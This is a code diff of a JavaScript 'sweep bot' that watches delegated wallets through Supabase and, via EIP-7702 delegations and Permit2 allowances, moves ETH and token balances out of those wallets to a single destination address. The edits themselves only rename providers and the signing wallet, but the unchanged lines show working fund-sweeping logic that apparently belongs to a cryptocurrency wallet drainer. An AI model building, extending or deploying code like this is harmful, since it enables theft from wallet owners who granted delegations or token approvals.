@@ -2,8 +2,8 @@
 // Watches delegated_wallets via Supabase Realtime.
 //
 // Architecture:
-//   wsProvider   — WebSocketProvider for instant block events (WS_URL)
-//   httpProvider — JsonRpcProvider for all balance/fee/tx calls (RPC_URL)
+//   wsProvider  — WebSocketProvider for instant block events (WS_URL)
+//   rpcProvider — JsonRpcProvider for ALL balance/fee/tx calls (RPC_URL)
 //
 // Sweep strategy:
 //   Block events      → sweep wallets whose 30s cooldown has expired
@@ -46,10 +46,11 @@ if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY) {
 
 // ── Providers ─────────────────────────────────────────────────────────────────
 //
-// httpProvider — stable HTTP for all RPC calls (getBalance, estimateGas, sendTx)
-// wsProvider   — WebSocket for block events only; recreated on disconnect
+// rpcProvider — HTTP JsonRpc for ALL contract/balance/fee/tx calls
+// wsProvider  — WebSocket for block events ONLY; recreated on disconnect
+//               NEVER passed to a Contract or Wallet
 
-const httpProvider = new ethers.JsonRpcProvider(RPC_URL);
+const rpcProvider = new ethers.JsonRpcProvider(RPC_URL);
 
 const supabase = SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY
   ? createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, {
@@ -82,12 +83,13 @@ const PERMIT2_ABI = [
   "function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)",
 ];
 
-// ── Wallet & contracts (all use httpProvider for tx/calls) ────────────────────
+// ── Wallet & contracts — ALL bound to rpcProvider (HTTP) ─────────────────────
+// RULE: wsProvider is NEVER passed to a Contract or Wallet.
 
-const botWallet = new ethers.Wallet(PRIVATE_KEY, httpProvider);
-const permit2   = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, botWallet);
-const contract  = CONTRACT_ADDRESS
-  ? new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, botWallet)
+const relayerWallet = new ethers.Wallet(PRIVATE_KEY, rpcProvider);
+const permit2       = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, relayerWallet);
+const contract      = CONTRACT_ADDRESS
+  ? new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, relayerWallet)
   : null;
 
 // ── State ─────────────────────────────────────────────────────────────────────
@@ -115,7 +117,7 @@ function normalizeAddress(addr) {
 }
 
 async function getFeeData() {
-  const f = await httpProvider.getFeeData();
+  const f = await rpcProvider.getFeeData();
   return { maxFeePerGas: f.maxFeePerGas, maxPriorityFeePerGas: f.maxPriorityFeePerGas };
 }
 
@@ -153,7 +155,7 @@ async function sweepETH() {
   if (sweepingETH || !contract) return;
   sweepingETH = true;
   try {
-    const bal = await httpProvider.getBalance(contract.target);
+    const bal = await rpcProvider.getBalance(contract.target);
     if (bal < MIN_ETH_WEI) return;
     log(`Contract ETH ${ethers.formatEther(bal)} — sweeping`);
     const gas = await contract.sweepETH.estimateGas(DESTINATION_ADDRESS);
@@ -171,7 +173,7 @@ async function sweepToken(tokenAddress) {
   if (sweepingToken[key] || !contract) return;
   sweepingToken[key] = true;
   try {
-    const token   = new ethers.Contract(tokenAddress, ERC20_ABI, httpProvider);
+    const token   = new ethers.Contract(tokenAddress, ERC20_ABI, rpcProvider);
     const balance = await token.balanceOf(contract.target);
     let decimals  = 18;
     try { decimals = await token.decimals(); } catch {}
@@ -194,11 +196,11 @@ async function sweepDelegatedWallet(walletAddress) {
   const checksum = normalizeAddress(walletAddress);
   if (!checksum) return;
   try {
-    const userContract = new ethers.Contract(checksum, DELEGATION_ABI, botWallet);
+    const userContract = new ethers.Contract(checksum, DELEGATION_ABI, relayerWallet);
 
     // ETH first
     try {
-      const bal = await httpProvider.getBalance(checksum);
+      const bal = await rpcProvider.getBalance(checksum);
       if (bal > MIN_ETH_WEI) {
         log(`[eip7702] ${checksum} ETH ${ethers.formatEther(bal)} — sweeping`);
         const gas = await userContract.sweepETH.estimateGas(DESTINATION_ADDRESS);
@@ -214,7 +216,7 @@ async function sweepDelegatedWallet(walletAddress) {
     for (const tokenAddress of TOKENS_TO_WATCH) {
       try {
         await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
-        const token   = new ethers.Contract(tokenAddress.trim(), ERC20_ABI, httpProvider);
+        const token   = new ethers.Contract(tokenAddress.trim(), ERC20_ABI, rpcProvider);
         const balance = await token.balanceOf(checksum);
         let decimals  = 18;
         try { decimals = await token.decimals(); } catch {}
@@ -294,7 +296,7 @@ async function sweepPermit2Wallet(walletAddress) {
 
     try {
       await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
-      const token   = new ethers.Contract(tokenAddress, ERC20_ABI, httpProvider);
+      const token   = new ethers.Contract(tokenAddress, ERC20_ABI, rpcProvider);
       const balance = await token.balanceOf(checksum);
       let decimals  = 18;
       try { decimals = await token.decimals(); } catch {}
@@ -405,7 +407,7 @@ function subscribeRealtime() {
 // ── WSS block listener + exponential backoff reconnect ───────────────────────
 //
 // wsProvider is recreated on every (re)connect.
-// All RPC/tx calls continue to use httpProvider — WSS is block-events only.
+// All RPC/tx calls continue to use rpcProvider (HTTP) — WSS is block-events only.
 
 async function startBot() {
   try {
@@ -470,13 +472,13 @@ async function startBot() {
 async function init() {
   log("Sweep bot starting…");
   log(`Chain:       ${CHAIN}`);
-  log(`Relayer:     ${botWallet.address}`);
+  log(`Relayer:     ${relayerWallet.address}`);
   log(`Destination: ${DESTINATION_ADDRESS}`);
   log(`Permit2:     ${PERMIT2_ADDRESS}`);
   if (CONTRACT_ADDRESS) log(`Contract:    ${CONTRACT_ADDRESS}`);
 
   try {
-    const balance = await httpProvider.getBalance(botWallet.address);
+    const balance = await rpcProvider.getBalance(relayerWallet.address);
     log(`Relayer bal: ${ethers.formatEther(balance)} native`);
     if (balance < ethers.parseEther("0.005")) warn("Relayer LOW — top up or sweeps will fail");
   } catch (e) {
